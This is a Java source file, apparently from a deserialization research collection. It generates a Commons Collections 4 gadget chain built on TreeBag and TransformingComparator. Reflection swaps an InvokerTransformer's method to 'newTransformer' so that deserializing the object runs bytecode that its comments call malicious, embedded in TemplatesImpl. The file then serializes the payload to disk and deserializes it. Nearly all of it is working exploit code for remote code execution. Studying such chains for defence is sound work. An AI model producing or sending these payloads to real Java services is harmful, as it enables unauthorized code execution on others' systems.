package org.su18.serialize.yoserial.CommonCollections.CommonCollections4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.su18.serialize.yoserial.Utils.SerializeUtil;

import java.lang.reflect.Field;

/**
 * @author su18
 */
public class CC4WithTreeBag {

	public static String fileName = "CC4WithTreeBag.bin";

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
		// 这个类是 public 的，方便调用
		Transformer            transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});
		TransformingComparator comparator  = new TransformingComparator(transformer);

		// prepare CommonsCollections object entry point
		TreeBag tree = new TreeBag(comparator);
		tree.add(tmpl);

		Field field = InvokerTransformer.class.getDeclaredField("iMethodName");
		field.setAccessible(true);
		field.set(transformer, "newTransformer");

		SerializeUtil.writeObjectToFile(tree, fileName);
		SerializeUtil.readFileObject(fileName);
	}
}
